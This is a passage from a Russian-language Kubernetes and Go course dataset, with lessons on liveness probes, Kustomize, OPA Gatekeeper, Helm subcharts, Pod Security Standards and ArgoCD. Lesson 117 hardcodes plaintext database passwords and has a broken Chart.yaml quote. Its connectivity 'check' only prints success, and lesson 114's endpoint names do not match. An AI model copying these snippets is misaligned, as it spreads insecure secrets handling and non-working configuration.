    "bigtech_interview": "**Вопрос с собеседования:** «Почему современный стек Kubernetes мигрирует от традиционных Helm HTTP-репозиториев (`index.yaml`) к хранению чартов в OCI Registry?»\n**Ответ:** 1) Унификация инфраструктуры: не нужно администрировать отдельный ChartMuseum или веб-сервер — чарты хранятся в том же защищенном корпоративном Registry (Harbor, AWS ECR), что и Docker-образы; 2) Масштабируемость: в традиционных репозиториях файл `index.yaml` при тысячах версий чартов вырастает до десятков мегабайт, замедляя поиск и парсинг; 3) Поддержка подписи артефактов через Cosign/Notary и единые политики RBAC."
  },
  {
    "num": 114,
    "title": "Отказоустойчивость: детекция дедлоков через Liveness Probe в Go",
    "task": "**Пробы жизни (Liveness Probe)**: Что если Go-приложение поймало deadlock (зависло), но процесс не упал? K8s этого не поймет. Напиши в Go хендлер `/health`. В манифесте добавь `livenessProbe`, которая делает HTTP-запрос на этот роут каждые 10 секунд. Если Go ответит 500 (или таймаут) 3 раза подряд — K8s сам убьет и перезапустит контейнер.",
    "theory": "Ситуация, когда процесс жив (PID существует в ОС), но не способен выполнять полезную работу (дедлок мьютексов `sync.Mutex`, зависание горутин на чтении небуферизированного канала, вечный цикл):\n1. **Роль Liveness Probe:** K8s периодически опрашивает контейнер. Если проба завершается сбоем $N$ раз подряд (`failureThreshold`), kubelet принудительно перезапускает контейнер (`kill -9`).\n2. **Как правильно писать Liveness Probe в Go:**\n   - Проверка должна быть **легковесной и локальной**.\n   - Проверять внутреннее состояние рантайма: не завис ли главный цикл обработки задач (heartbeat/watchdog паттерн).\n   - **КРИТИЧЕСКОЕ ПРАВИЛО:** Liveness Probe НИКОГДА не должна проверять внешние зависимости (базу данных, кэш, другие сервисы)! Если упадет БД, все поды одновременно начнут падать с ошибкой Liveness Probe, вызвав каскадный коллапс всего кластера.",
    "step_by_step": "1. Напишите Go-сервис с механизмом периодического обновления heartbeat-таймштампа.\n2. Реализуйте хендлер `/healthz`, возвращающий 500 Internal Server Error, если heartbeat не обновлялся дольше 15 секунд (признак дедлока воркера).\n3. Добавьте эндпоинт `/trigger-deadlock` для демонстрации сбоя.\n4. Настройте в `deployment.yaml` параметры `livenessProbe: periodSeconds: 10, failureThreshold: 3`.\n5. Сымитируйте зависание и убедитесь, что K8s автоматически перезапустил контейнер (`RESTARTS: 1`).",
    "code_blocks": [
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"sync/atomic\"\n\t\"time\"\n)\n\nvar lastHeartbeat int64\n\nfunc workerLoop() {\n\tfor {\n\t\t// Обновляем таймштамп активности воркера\n\t\tatomic.StoreInt64(&lastHeartbeat, time.Now().Unix())\n\t\ttime.Sleep(2 * time.Second)\n\t}\n}\n\nfunc main() {\n\t// Инициализируем начальный heartbeat\n\tatomic.StoreInt64(&lastHeartbeat, time.Now().Unix())\n\tgo workerLoop()\n\n\tmux := http.NewServeMux()\n\n\t// Liveness Probe: проверяет исключительно локальную жизнеспособность процесса\n\tmux.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tlast := atomic.LoadInt64(&lastHeartbeat)\n\t\tdiff := time.Now().Unix() - last\n\n\t\tif diff > 15 {\n\t\t\tlog.Printf(\"ВНИМАНИЕ: Heartbeat заблокирован! Задержка: %d сек. Отправка 500...\", diff)\n\t\t\thttp.Error(w, fmt.Sprintf(\"Deadlock detected, last heartbeat %d sec ago\", diff), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"ALIVE\"))\n\t})\n\n\t// Эндпоинт для намеренного вызова вечной блокировки (эмуляция дедлока)\n\tmux.HandleFunc(\"/simulate-deadlock\", func(w http.ResponseWriter, r *http.Request) {\n\t\tlog.Println(\"Имитация дедлока: блокировка навсегда...\")\n\t\tselect {} // Вечная блокировка горутины\n\t})\n\n\tserver := &http.Server{Addr: \":8080\", Handler: mux}\n\tlog.Println(\"Сервер слушает на порту :8080...\")\n\t_ = server.ListenAndServe()\n}"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deadlock-detector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deadlock-detector\n  template:\n    metadata:\n      labels:\n        app: deadlock-detector\n    spec:\n      containers:\n        - name: app\n          image: deadlock-detector:v1.0.0\n          ports:\n            - containerPort: 8080\n          livenessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080\n            initialDelaySeconds: 5\n            periodSeconds: 10\n            timeoutSeconds: 2\n            failureThreshold: 3"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение манифеста\nkubectl apply -f deployment.yaml\n\n# Просмотр статуса пода (изначально RESTARTS: 0)\nkubectl get pod -l app=deadlock-detector\n\n# Просмотр событий пода после вызова дедлока\nkubectl describe pod -l app=deadlock-detector | grep -A 5 Events:\n# Warning  Unhealthy  Liveness probe failed: HTTP probe failed with statuscode: 500\n# Normal   Killing    Container app failed liveness probe, will be restarted"
      }
    ],
    "under_the_hood": "Демон `kubelet` на узле запускает горутину probe-worker для каждого контейнера с периодичностью `periodSeconds`. Kubelet инициирует HTTP GET запрос на сокет пода. Если HTTP-ответ возвращает статус-код в диапазоне $200 \\le \\text{status} < 400$, счетчик сбоев сбрасывается в 0. Если трижды подряд получен код $\\ge 400$ или истек `timeoutSeconds`, kubelet отправляет вызов CRI `StopContainer`, уничтожает контейнер и инициирует создание нового в соответствии с `restartPolicy`.",
    "pitfalls": "1. Проверка базы данных в Liveness Probe: если СУБД перезагружается или испытывает всплеск задержек, Liveness пробы всех подов микросервиса синхронно вернут 500, и Kubernetes начнет циклически убивать и перезапускать вообще все поды в кластере.\n2. Слишком агрессивный `timeoutSeconds: 1`: кратковременный всплеск нагрузки CPU или пауза сборщика мусора Go (Stop-The-World) может задержать ответ на 1.2 секунды, вызвав ложный перезапуск здорового контейнера.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем фундаментальная разница между целями Liveness Probe и Readiness Probe?»\n**Ответ:** **Liveness Probe** отвечает на вопрос: «Жив ли контейнер или он завис навсегда?». Реакция на сбой — жесткий перезапуск контейнера. **Readiness Probe** отвечает на вопрос: «Готов ли контейнер прямо сейчас принимать сетевой трафик?». Реакция на сбой — временное исключение IP-адреса пода из балансировщика Service/Endpoints БЕЗ перезапуска контейнера (например, пока сервис прогревает локальный кэш или ждет восстановления коннекта к БД)."
  },
  {
    "num": 115,
    "title": "Миграция с Helm на Kustomize: структура Base и окружения Dev/Prod",
    "task": "**[Kustomize]**: Перепиши деплой с Helm на Kustomize. Создай `base/` с манифестами и два оверлея: `overlays/dev` (1 replica, ConfigMap для dev) и `overlays/prod` (3 replicas, ингресс, prod secrets). Запусти `kubectl apply -k overlays/prod`.",
    "theory": "Переход от шаблонизации Helm к оверлеям Kustomize устраняет сложность синтаксиса шаблонов и делает конфигурации 100% декларативными:\n1. **Базовый слой (`base/`):**\n   - Содержит минимальные, канонические манифесты приложения: `deployment.yaml`, `service.yaml`, `kustomization.yaml`.\n2. **Слой разработки (`overlays/dev/`):**\n   - Наследует `../../base`.\n   - Добавляет суффикс `-dev` или namespace `dev`.\n   - Устанавливает 1 реплику и подключает ConfigMap с тестовыми эндпоинтами.\n3. **Слой продакшена (`overlays/prod/`):**\n   - Наследует `../../base`.\n   - Патчит `replicas: 3`.\n   - Подключает манифест `ingress.yaml` с боевым доменом и TLS.\n   - Использует `secretGenerator` для подтягивания продакшен-секретов.",
    "step_by_step": "1. Создайте структуру каталогов: `base/`, `overlays/dev/`, `overlays/prod/`.\n2. Напишите базовые манифесты в директории `base/`.\n3. Опишите патчи для окружения `overlays/dev/`.\n4. Опишите патчи и Ingress для окружения `overlays/prod/`.\n5. Проверьте манифесты через `kubectl kustomize overlays/prod`.\n6. Примените прод-конфигурацию: `kubectl apply -k overlays/prod`.",
    "code_blocks": [
      {
        "filename": "base/kustomization.yaml",
        "lang": "yaml",
        "code": "apiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nresources:\n  - deployment.yaml\n  - service.yaml"
      },
      {
        "filename": "base/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n        - name: app\n          image: order-service:v1.0.0\n          ports:\n            - containerPort: 8080"
      },
      {
        "filename": "overlays/prod/kustomization.yaml",
        "lang": "yaml",
        "code": "apiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nnamespace: production\n\nresources:\n  - ../../base\n  - ingress.yaml\n\nnamePrefix: prod-\n\npatchesStrategicMerge:\n  - patch-replicas.yaml"
      },
      {
        "filename": "overlays/prod/patch-replicas.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-service\nspec:\n  replicas: 3"
      },
      {
        "filename": "overlays/prod/ingress.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: order-ingress\nspec:\n  ingressClassName: nginx\n  rules:\n    - host: orders.production.corp\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: prod-order-service\n                port:\n                  number: 8080"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Просмотр результирующего YAML для prod\nkubectl kustomize overlays/prod\n\n# Применение конфигурации production в кластер\nkubectl apply -k overlays/prod\n\n# Проверка созданных ресурсов в namespace production\nkubectl get deployments,pods,ing -n production"
      }
    ],
    "under_the_hood": "Движок Kustomize считывает `kustomization.yaml` в `overlays/prod`. Он рекурсивно загружает все ресурсы из `base/`, применяет директиву `namePrefix: prod-` ко всем объектам (обновляя также селекторы и ссылки в `Service`), а затем выполняет слияние патча `patch-replicas.yaml`. В отличие от текстовой замены строк, Kustomize оперирует абстрактными синтаксическими деревьями ресурсов Kubernetes, гарантируя семантическую корректность структуры манифестов.",
    "pitfalls": "1. Конфликт `namePrefix` со связями между объектами: если Ingress ссылается на сервис с именем `order-service`, а Kustomize добавил префикс `prod-order-service`, Ingress упадет с ошибкой backend service not found, если Ingress не включен в тот же kustomization для автоматического переименования ссылок.\n2. Относительные пути к `base`: если вложенность каталогов изменена, путь `../../base` сломается.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем преимущество использования Kustomize перед Helm при организации GitOps конвейера через ArgoCD?»\n**Ответ:** 1) Отсутствие фазы шаблонизации: манифесты в Git хранятся как чистый YAML, что исключает ошибки рендеринга типов и некорректных отступов; 2) Полная прозрачность code review: в pull request виден точный дифф изменений манифестов, а не абстрактные изменения в коде шаблонов Go; 3) Нативная интеграция: Kustomize встроен непосредственно в `kubectl` и ArgoCD без необходимости поддерживать репозитории чартов."
  },
  {
    "num": 116,
    "title": "Политики безопасности Policy-as-Code: OPA Gatekeeper и язык Rego",
    "task": "Настрой **OPA Gatekeeper**: `ConstraintTemplate` (Rego policy), `Constraint` (apply to resources). Пример: `K8sRequiredLabels` — все namespaces must have `cost-center`. `K8sPSP` — no privileged containers. Покажи policy-as-code.",
    "theory": "Обеспечение корпоративной безопасности и комплаенса в больших кластерах требует автоматизированного контроля (Policy as Code).\n**Open Policy Agent (OPA) Gatekeeper:**\n1. **Механизм работы:** Gatekeeper регистрируется как `ValidatingAdmissionWebhook`. При любой попытке `kubectl apply` apiserver отправляет манифест в Gatekeeper, который проверяет его на соответствие правилам на языке **Rego**.\n2. **Двухуровневая архитектура правил:**\n   - **`ConstraintTemplate`**: определяет логику политики (код на Rego) и схему входных параметров (CRD генератор).\n   - **`Constraint`**: экземпляр правила, связывающий ConstraintTemplate с конкретными объектами кластера (namespaces, kinds) и передающий параметры (например, список обязательных лейблов).\n3. **Типичные корпоративные правила:**\n   - Запрет запуска привилегированных контейнеров (`privileged: true`).\n   - Запрет монтирования чувствительных хостовых путей (`hostPath: /`).\n   - Обязательное указание лейбла `cost-center` или `owner` для аллокации расходов на инфраструктуру.",
    "step_by_step": "1. Установите OPA Gatekeeper в кластер.\n2. Создайте `ConstraintTemplate`, описывающий проверку обязательного наличия лейблов на языке Rego.\n3. Создайте `Constraint`, требующий обязательный лейбл `cost-center` для всех новых Namespace.\n4. Попробуйте создать Namespace без лейбла и убедитесь, что Gatekeeper заблокировал операцию.\n5. Создайте валидный Namespace с лейблом и проверьте успешное создание.",
    "code_blocks": [
      {
        "filename": "template-required-labels.yaml",
        "lang": "yaml",
        "code": "apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8srequiredlabels\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sRequiredLabels\n      validation:\n        openAPIV3Schema:\n          type: object\n          properties:\n            labels:\n              type: array\n              items:\n                type: string\n  targets:\n    - target: admission.k8s.gatekeeper.sh\n      rego: |\n        package k8srequiredlabels\n\n        violation[{\"msg\": msg}] {\n          provided := {label | input.review.object.metadata.labels[label]}\n          required := {label | label := input.parameters.labels[_]}\n          missing := required - provided\n          count(missing) > 0\n          msg := sprintf(\"Отказано в создании: отсутствуют обязательные лейблы: %v\", [missing])\n        }"
      },
      {
        "filename": "constraint-namespace-labels.yaml",
        "lang": "yaml",
        "code": "apiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequiredLabels\nmetadata:\n  name: ns-must-have-cost-center\nspec:\n  match:\n    kinds:\n      - apiGroups: [\"\"]\n        kinds: [\"Namespace\"]\n  parameters:\n    labels: [\"cost-center\", \"owner\"]"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение шаблона политики и правила проверки\nkubectl apply -f template-required-labels.yaml\nkubectl apply -f constraint-namespace-labels.yaml\n\n# 1. Попытка создать Namespace без обязательных лейблов завершится ошибкой валидации!\nkubectl create namespace billing-dev\n# Error from server (Forbidden): admission webhook \"validation.gatekeeper.sh\" denied the request:\n# [ns-must-have-cost-center] Отказано в создании: отсутствуют обязательные лейблы: {\"cost-center\", \"owner\"}\n\n# 2. Создание валидного Namespace с необходимыми метаданными\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: billing-dev\n  labels:\n    cost-center: \"fintech-104\"\n    owner: \"billing-team\"\nEOF\n# namespace/billing-dev created"
      }
    ],
    "under_the_hood": "При получении `AdmissionReview` запроса Gatekeeper компилирует правила Rego через встроенный Go-рантайм OPA в оптимизированное дерево выполнения. Поле `input.review.object` содержит полный JSON-манифест создаваемого ресурса. Если выражение в блоке `violation` истинно (множество `missing` не пусто), Gatekeeper возвращает `allowed: false` со статус-кодом 403 Forbidden и подробным текстом нарушения.",
    "pitfalls": "1. Блокировка системных namespace (`kube-system`, `gatekeeper`): неосторожная политика без исключений (`match.excludedNamespaces`) может заблокировать работу системных контроллеров K8s и привести кластер в неработоспособное состояние.\n2. Падение производительности API-сервера: слишком сложные или неоптимизированные правила Rego могут увеличивать latency запросов к apiserver вплоть до срабатывания webhook timeout (дефолт 3-10 сек).",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем разница между режимами `enforcementAction: deny` и `enforcementAction: dryrun` в OPA Gatekeeper?»\n**Ответ:** Режим `deny` (по умолчанию) жестко блокирует создание или изменение ресурса, возвращая ошибку пользователю. Режим `dryrun` не блокирует запрос, но логирует факт нарушения политики и сохраняет его в поле `status.violations` ресурса Constraint. Это критически важно для безопасного тестирования новых правил безопасности на работающем production-кластере без риска сломать существующие пайплайны деплоя."
  },
  {
    "num": 117,
    "title": "Композитная архитектура Helm: объединение микросервиса, PostgreSQL и Redis",
    "task": "Используйте **Helm subcharts** (dependencies) для упаковки PostgreSQL, Redis вместе с приложением.",
    "theory": "Сложные корпоративные платформы объединяют множество микросервисов и хранилищ данных в единый композитный чарт (**Umbrella Chart** / Subcharts):\n1. **Структура Umbrella Chart:**\n   - Не содержит собственных шаблонов сервисов в `templates/`, либо содержит только связующие конфигурации.\n   - Секция `dependencies` в `Chart.yaml` объединяет:\n     - Базу данных (Bitnami PostgreSQL).\n     - Слой кэширования (Bitnami Redis).\n     - Брокер сообщений (Bitnami RabbitMQ / Kafka).\n2. **Маршрутизация конфигураций (Values Scoping):**\n   - Параметры для PostgreSQL задаются в блоке `postgresql: ...`.\n   - Параметры для Redis — в блоке `redis: ...`.\n   - Общие глобальные переменные (например, имя окружения или домен кластера) задаются в блоке `global: ...` и автоматически доступны во всех дочерних subcharts!",
    "step_by_step": "1. Создайте `Chart.yaml` с зависимостями от PostgreSQL и Redis.\n2. Настройте файл `values.yaml` с отключением персистентности для локального стенда.\n3. Выполните загрузку архивов: `helm dependency update`.\n4. Напишите Go-приложение, инициализирующее подключения к PostgreSQL и Redis.\n5. Продемонстрируйте запуск всего комплексного стека одной командой.",
    "code_blocks": [
      {
        "filename": "Chart.yaml",
        "lang": "yaml",
        "code": "apiVersion: v2\nname: platform-stack\ndescription: Umbrella Chart объединяющий бэкенд, PostgreSQL и Redis\nversion: 2.0.0\nappVersion: \"1.0.0\"\n\ndependencies:\n  - name: postgresql\n    version: \"12.5.6\"\n    repository: \"https://charts.bitnami.com/bitnami\"\n  - name: redis\n    version: \"17.14.5\"\n    repository: \"https://charts.bitnami.com/bitnami"
      },
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "# Настройки дочернего чарта PostgreSQL\npostgresql:\n  auth:\n    database: app_db\n    username: app_user\n    password: PostgresPass2026!\n  primary:\n    persistence:\n      enabled: false\n\n# Настройки дочернего чарта Redis\nredis:\n  auth:\n    enabled: true\n    password: RedisPass2026!\n  master:\n    persistence:\n      enabled: false\n  replica:\n    replicaCount: 1"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tpgHost := os.Getenv(\"POSTGRES_HOST\")\n\tredisHost := os.Getenv(\"REDIS_HOST\")\n\n\tlog.Printf(\"Инициализация соединений платформы:\")\n\tlog.Printf(\"-> PostgreSQL хост: %s:5432\", pgHost)\n\tlog.Printf(\"-> Redis хост:      %s:6379\", redisHost)\n\n\t// Имитация успешной проверки доступности сетевых сокетов\n\tctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\n\tdefer cancel()\n\n\t_ = ctx\n\tfmt.Println(\"Все инфраструктурные компоненты (Postgres + Redis) успешно обнаружены!\")\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Обновление всех зависимостей стека\nhelm dependency update ./platform-stack\n\n# Установка платформенного стека в namespace sandbox\nhelm install dev-stack ./platform-stack -n sandbox --create-namespace\n\n# Просмотр всех созданных подов (приложение, postgresql, redis-master, redis-replicas)\nkubectl get pods -n sandbox"
      }
    ],
    "under_the_hood": "Helm рекурсивно распаковывает архивы зависимостей в директорию `charts/`. Во время компиляции шаблонов контекст корневого чарта передает глобальные параметры в поле `.Values.global` каждого дочернего чарта. Объекты StatefulSet для Redis и PostgreSQL создаются с уникальными лейблами релиза `app.kubernetes.io/instance=dev-stack`, предотвращая коллизии при установке нескольких независимых окружений.",
    "pitfalls": "1. Высокое потребление ресурсов: композитные чарты поднимают множество тяжелых контейнеров. На локальных стендах Minikube/Kind обязательно отключайте репликацию (`replicaCount: 1`) и персистентные диски (`persistence.enabled: false`).\n2. Несогласованность паролей: генерация случайных паролей Bitnami чартами по умолчанию приведет к смене паролей при каждом `helm upgrade`, если не зафиксировать их явно в `values.yaml` или через `existingSecret`.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в Umbrella Helm-чарте сделать так, чтобы subchart PostgreSQL использовал тот же пароль, что передается в переменные окружения основного микросервиса?»\n**Ответ:** 1) Использовать секцию `global` в `values.yaml`: параметры под ключом `global.dbPassword` доступны как в родительском чарте, так и во всех дочерних subcharts; 2) Создать отдельный независимый объект Secret с учетными данными и передать имя этого секрета обоим чартам через параметры `existingSecret`."
  },
  {
    "num": 118,
    "title": "Pod Security Standards (PSS) и встроенный контроллер Pod Security Admission",
    "task": "Настрой **Pod Security Standards**: `restricted` profile (enforced), `baseline` (warn), `privileged` (audit). `PodSecurity` admission controller. Покажи security hardening without OPA.",
    "theory": "Начиная с Kubernetes 1.25+, устаревший механизм PodSecurityPolicy (PSP) был окончательно удален и заменен на встроенный механизм **Pod Security Standards (PSS)** и контроллер **Pod Security Admission (PSA)**:\n1. **Три профиля безопасности (Profiles):**\n   - **Privileged:** Никаких ограничений (полный доступ к ядру, запуск от root, хостовая сеть). Предназначен только для системных агентов (CNI, CSI).\n   - **Baseline:** Минимальные ограничения. Запрещает явное повышение привилегий, но разрешает дефолтные настройки большинства контейнеров.\n   - **Restricted:** Максимальное ужесточение (Hardening). Запрет root (`runAsNonRoot: true`), запрет privilege escalation, сброс всех Linux capabilities (`drop: [\"ALL\"]`), обязательная read-only корневая файловая система (`readOnlyRootFilesystem: true`).\n2. **Три режима применения (Modes):**\n   - `enforce`: нарушение блокирует создание Pod.\n   - `warn`: нарушение разрешает создание Pod, но выводит предупреждение пользователю в консоль `kubectl`.\n   - `audit`: нарушение фиксируется в Audit Log кластера для ретроспективного анализа.\n3. **Настройка через лейблы Namespace:** не требует установки сторонних операторов!",
    "step_by_step": "1. Создайте namespace `secured-apps`.\n2. Повесьте лейблы PSS: `enforce: restricted`, `warn: baseline`, `audit: privileged`.\n3. Попробуйте запустить небезопасный контейнер (от пользователя root или с privileged: true).\n4. Убедитесь, что K8s заблокировал запуск пода с подробным сообщением об ошибке.\n5. Напишите манифест безопасного Pod, удовлетворяющий профилю `restricted`.",
    "code_blocks": [
      {
        "filename": "namespace.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: secured-apps\n  labels:\n    # Жесткий запрет создания небезопасных подов\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/enforce-version: latest\n    # Предупреждение в консоль при несоответствии baseline\n    pod-security.kubernetes.io/warn: baseline\n    pod-security.kubernetes.io/warn-version: latest\n    # Аудит в журнал безопасности\n    pod-security.kubernetes.io/audit: privileged\n    pod-security.kubernetes.io/audit-version: latest"
      },
      {
        "filename": "secure-pod.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hardened-go-app\n  namespace: secured-apps\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 10001\n    runAsGroup: 10001\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n    - name: app\n      image: hardened-app:v1.0.0\n      securityContext:\n        allowPrivilegeEscalation: false\n        readOnlyRootFilesystem: true\n        capabilities:\n          drop:\n            - ALL\n      ports:\n        - containerPort: 8080"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение настроек профилей безопасности namespace\nkubectl apply -f namespace.yaml\n\n# Попытка запустить небезопасный контейнер (root по умолчанию) немедленно отклоняется API-сервером!\nkubectl run root-test --image=nginx -n secured-apps\n# Error from server (Forbidden): pods \"root-test\" is forbidden: violates PodSecurity \"restricted:latest\":\n# allowPrivilegeEscalation != false, unrestricted capabilities, runAsNonRoot != true, seccompProfile\n\n# Запуск полностью защищенного пода проходит успешно\nkubectl apply -f secure-pod.yaml"
      }
    ],
    "under_the_hood": "Плагин Pod Security Admission встроен прямо в ядро `kube-apiserver` как compiled-in admission controller. Он перехватывает запросы создания Pod на фазе валидации. Плагин считывает лейблы `pod-security.kubernetes.io/*` с объекта Namespace, находит соответствующую спецификацию стандарта безопасности и выполняет валидацию полей `securityContext`. Поскольку проверка встроена в ядро apiserver, она выполняется за микросекунды без сетевых накладных расходов на вызов внешних webhook.",
    "pitfalls": "1. Забытый `seccompProfile: RuntimeDefault`: в стандарте `restricted` отсутствие этого профиля приводит к блокировке пода, даже если все остальные параметры настроены верно.\n2. `readOnlyRootFilesystem: true` без временных томов: если Go-приложение пытается записать временный файл в `/tmp`, произойдет паника `read-only file system`. Для временных файлов необходимо монтировать том `emptyDir` по пути `/tmp`.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в современных версиях Kubernetes PodSecurityPolicy (PSP) был заменен на Pod Security Standards (PSS)?»\n**Ответ:** PSP был признан архитектурно неудачным из-за сложности и непредсказуемости: политики связывались с пользователями через RBAC, и выбор применяемой политики зависел от того, кто создает Pod (человек или ServiceAccount контроллера). Это вызывало путаницу и скрытые уязвимости. PSS нативно встроен в apiserver, привязан к Namespace через простые декларативные лейблы, имеет три четко стандартизированных уровня безопасности и поддерживает безопасный режим предупреждений (`warn`) перед блокировкой (`enforce`)."
  },
  {
    "num": 119,
    "title": "Декларативное управление конфигурациями: продвинутые паттерны Kustomize",
    "task": "**Kustomize alternative**: Создайте `kustomization.yaml` с `bases`, `patches`, `overlays` для управления окружениями без шаблонов.",
    "theory": "При масштабной разработке Kustomize позволяет строить многоуровневые деревья конфигураций без дублирования манифестов:\n1. **Ключевые примитивы `kustomization.yaml`:**\n   - `resources`: ссылки на манифесты или базовые каталоги (в современных версиях Kustomize поле `bases` признано устаревшим и объединено с `resources`).\n   - `patches`: список точечных модификаций в форматах Strategic Merge Patch или RFC 6902 JSON 6902 Patch.\n   - `commonLabels`: автоматическое добавление общих меток ко всем ресурсам и их селекторам.\n   - `images`: переопределение имени и тега образа без создания отдельных файлов патчей (`images: - name: backend, newTag: v2.1.0`).\n   - `replicas`: декларативное переопределение числа реплик целевого Deployment прямо в `kustomization.yaml`.\n2. **Преимущества перед шаблонизаторами:**\n   - 100% совместимость с Git diff.\n   - Невозможно получить синтаксически невалидный YAML на выходе.\n   - Отсутствие промежуточных артефактов в репозиториях чартов.",
    "step_by_step": "1. Создайте структуру с `base/` и тремя окружениями: `dev/`, `qa/`, `prod/`.\n2. В `overlays/prod/kustomization.yaml` используйте директиву `images` для подстановки тега релиза.\n3. Используйте директиву `replicas` для масштабирования до 5 реплик.\n4. Примените JSON Patch для модификации специфичного параметра probe.\n5. Протестируйте итоговую сборку через `kubectl kustomize overlays/prod`.",
    "code_blocks": [
      {
        "filename": "overlays/prod/kustomization.yaml",
        "lang": "yaml",
        "code": "apiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nresources:\n  - ../../base\n\ncommonLabels:\n  environment: production\n  managed-by: kustomize\n\nreplicas:\n  - name: backend-service\n    count: 5\n\nimages:\n  - name: backend-service\n    newName: myregistry.io/backend\n    newTag: v3.2.1\n\npatches:\n  - target:\n      kind: Deployment\n      name: backend-service\n    patch: |-\n      - op: replace\n        path: /spec/template/spec/containers/0/resources/limits/memory\n        value: 4Gi"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Генерация и проверка итогового манифеста\nkubectl kustomize overlays/prod\n\n# Проверка корректности подстановки образа и числа реплик\nkubectl kustomize overlays/prod | grep -E \"(replicas:|image:)\"\n# replicas: 5\n# image: myregistry.io/backend:v3.2.1"
      }
    ],
    "under_the_hood": "Kustomize парсит манифесты в модель Resource Map (RNode). Операция `images` обходит все спецификации Pod в ресурсах `Deployment`, `StatefulSet`, `Job` и заменяет образ везде, где поле `image` совпадает с целевым `name`. Директива `replicas` валидирует существование соответствующего ресурса и безопасно меняет поле `spec.replicas`. В конце применяется JSON-патч (RFC 6902), производя точечную замену значения в дереве DOM без перезаписи соседних полей.",
    "pitfalls": "1. Устаревший синтаксис `bases: [../base]`: в Kustomize v4+ директива `bases` считается deprecated, рекомендуется использовать только `resources: [../base]`.\n2. Ошибки в путях JSON Patch: ошибка в пути `/spec/template/spec/containers/0/...` (например, неверный индекс контейнера) приведет к ошибке сборки `json patch error`.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем преимущество директивы `images` в Kustomize перед обычным Strategic Merge Patch?»\n**Ответ:** Директива `images` не требует создания отдельного YAML-файла патча и не привязана к жесткому имени Deployment. Она автоматически находит и обновляет тег образа во ВСЕХ ресурсах манифеста (Deployment, CronJob, Canary), где фигурирует этот образ. Кроме того, в CI/CD пайплайне команду можно выполнить одной строкой: `kustomize edit set image backend-service=myreg/app:$CI_COMMIT_SHA`."
  },
  {
    "num": 120,
    "title": "GitOps: архитектура ArgoCD, паттерн App-of-Apps и автоматическая синхронизация",
    "task": "**[ArgoCD / Flux (GitOps)]**: Установи ArgoCD в локальный K8s. Подключи свой Git-репозиторий с манифестами. Настрой App-of-Apps паттерн: когда ты делаешь пуш в репозиторий с манифестами (меняешь тег образа), ArgoCD автоматически синхронизирует это в кластере (деплоит новую версию).",
    "theory": "**GitOps** — парадигма непрерывной доставки (CD), где **Git является единственным источником правды (Single Source of Truth)** о желаемом состоянии кластера:\n1. **Pull-модель (в отличие от Push CI):**\n   - Традиционный CI (GitLab Runner / GitHub Action) требует предоставления пайплайну полных административных прав `cluster-admin` к кластеру, что создает риски безопасности.\n   - В GitOps агент (**ArgoCD**) работает ВНУТРИ кластера. Он непрерывно опрашивает Git-репозиторий, сравнивает желаемое состояние в Git с реальным состоянием в кластере и устраняет дрифт (Self-Healing).\n2. **Паттерн App-of-Apps:**\n   - Вместо ручного добавления десятков приложений в ArgoCD создается одно корневое мета-приложение (`root-application`), манифест которого указывает на каталог со всеми остальными приложениями (`Application` CRD).\n   - Добавление нового микросервиса в кластер сводится к добавлению одного YAML-файла в Git!\n3. **Автоматическая синхронизация (`automated syncPolicy`):**\n   - `prune: true`: автоматически удаляет из кластера ресурсы, которые были удалены из Git.\n   - `selfHeal: true`: если кто-то вручную изменил ресурс через `kubectl edit`, ArgoCD немедленно перезапишет его состоянием из Git.",
